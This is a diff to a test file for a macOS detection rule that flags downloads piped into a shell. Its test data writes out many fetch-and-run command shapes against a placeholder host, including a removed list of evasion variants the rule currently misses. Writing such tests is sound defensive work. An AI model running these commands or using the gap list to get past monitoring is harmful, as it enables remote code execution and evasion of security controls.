@@ -5,7 +5,7 @@ import { macosCoreRules } from '../packs/macos-core.js';
 import { isQuietLine, runsQuietLine } from '../rules/quiet-lines.js';
 import { memoryStores } from '../state/stores.js';
 import type { Condition, DetectionEvent, DetectionRuleInput } from '../types.js';
-import { exec, REAL_LOCAL_READS, shell } from './fixtures.js';
+import { DOWNLOAD_RUN_GAPS, exec, REAL_LOCAL_READS, shell } from './fixtures.js';
 
 const RULE = 'download-pipe-to-shell';
 const wrapped = (c: string) =>
@@ -82,8 +82,8 @@ describe('quiet download lines', () => {
 
   // Codex's round-4 shapes. None is a quiet line, so each gets main's verdict.
   // Where main alerts, the test says so. Where main stays quiet too, the gap
-  // predates this change and is tracked for a follow-up rule (a broad "curl
-  // anywhere" rule would flood developer machines).
+  // predates this change; the shadow rule download-then-run records those
+  // (see download-run.test.ts).
   const caught = [
     'bash <<< "$(curl -s https://x.test/a)"',
     'timeout 5 curl -s https://x.test/a | sh',
@@ -93,20 +93,7 @@ describe('quiet download lines', () => {
     // A quoted heredoc holding the line as text: main alerts on the text.
     "cat <<'EOF'\ncurl -s https://x.test/a | sh\nEOF",
   ];
-  const gaps = [
-    "curl -s https://x.test/a | awk '{system($0)}'",
-    'curl -s https://x.test/a | find /dev/stdin -exec sh {} \\;',
-    "curl -s https://x.test/a | git -c alias.x='!sh' x",
-    'curl -s https://x.test/a | xargs env',
-    "curl -s https://x.test/a | sed 's/.*/&/e'",
-    'curl -s https://x.test/a | tar -xf - --to-command=sh',
-    'bash < <(curl -s https://x.test/a)',
-    'curl -s https://x.test/a > >(sh)',
-    "curl -s https://x.test/a | env -S 'sh -s'",
-    'curl -s https://x.test/a | exec -a x bash',
-    'curl -s https://x.test/a | /bin/$(printf sh)',
-    "eval 'curl -s https://x.test/a |' 'sh'",
-  ];
+  const gaps = DOWNLOAD_RUN_GAPS;
 
   it('never treats a round-4 shape as a quiet line, bare or wrapped', () => {
     for (const c of [...caught, ...gaps]) {
@@ -127,7 +114,4 @@ describe('quiet download lines', () => {
   it('leaves the pre-existing gaps exactly as main has them', () => {
     for (const c of gaps) expect(ours(c), c).toBe(mains(c));
   });
-
-  // Tracked for a follow-up rule; main does not alert on these either.
-  for (const c of gaps) it.todo(`alerts on a download fed to a consumer that runs it: ${c}`);
 });
